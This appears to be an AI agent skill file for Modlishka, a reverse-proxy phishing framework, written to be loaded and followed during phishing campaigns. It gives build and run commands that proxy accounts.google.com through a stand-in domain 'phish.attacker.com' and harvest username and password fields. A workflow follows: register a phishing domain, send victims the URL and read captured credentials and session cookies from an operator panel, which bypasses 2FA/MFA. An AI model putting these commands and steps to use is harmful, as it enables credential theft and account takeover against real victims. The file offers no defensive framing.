---
name: modlishka
description: "Modlishka: flexible reverse proxy phishing framework that captures credentials and session cookies while bypassing 2FA/MFA. Use when conducting phishing campaigns targeting OTP or push MFA by acting as a transparent MITM between victim and the real site."
license: GPL-3.0
compatibility: "Linux. Build with Go 1.14+. Requires valid TLS cert for the phishing domain."
metadata:
  author: AeonDave
  version: "1.0"
---

# Modlishka

Reverse-proxy phishing that bypasses 2FA/MFA.

## Quick Start

```bash
git clone https://github.com/drk1wi/Modlishka && cd Modlishka && make

./Modlishka -target https://accounts.google.com \
  -phishing phish.attacker.com \
  -cert cert.pem -key key.pem \
  -credParams username=,password=

./Modlishka -config config.json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-target` | Real site to proxy |
| `-phishing` | Attacker phishing domain |
| `-cert / -key` | TLS certificate paths |
| `-credParams` | Field names to harvest |
| `-trackingCookie` | Victim tracking cookie name |
| `-jsRules` | JavaScript inject rules |
| `-config` | JSON config file path |

## Workflow

1. Register phishing domain + get TLS cert (Let's Encrypt)
2. Fill `config.json` with target, domain, TLS paths
3. Start Modlishka; send victim the phishing URL
4. Observer panel at `http://127.0.0.1:8888` shows captured credentials + session cookies

## Resources

| File | When to load |
|------|--------------|
| `references/` | Config template, operator panel usage |
